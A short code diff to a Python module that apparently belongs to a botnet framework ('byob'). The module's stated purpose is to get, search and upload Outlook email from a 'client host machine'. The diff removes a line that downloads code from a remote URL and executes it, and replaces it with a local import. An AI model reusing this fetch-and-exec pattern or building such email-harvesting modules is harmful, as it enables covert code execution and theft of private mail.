@@ -10,10 +10,13 @@ import json
 import urllib
 import threading
 
+# packages
+if sys.platform == 'win32':
+    import pythoncom
+    import win32com.client
+
 # utilities
-util = imp.new_module('util')
-exec compile(urllib.urlopen('https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py').read(), 'https://raw.githubusercontent.com/colental/byob/master/byob/core/util.py', 'exec') in util.__dict__
-sys.modules['util'] = util
+import core.util as util
 
 # globals
 packages = ['win32com.client','pythoncom']
@@ -23,10 +26,6 @@ usage = 'outlook <get/count/search/upload>'
 description = """
 Interact with the Outlook email client application on the client host machine
 """
-
-# setup
-if util.is_compatible(platforms, __name__):
-    util.imports(packages, __builtins__)
 
 # main
 def _get_emails():
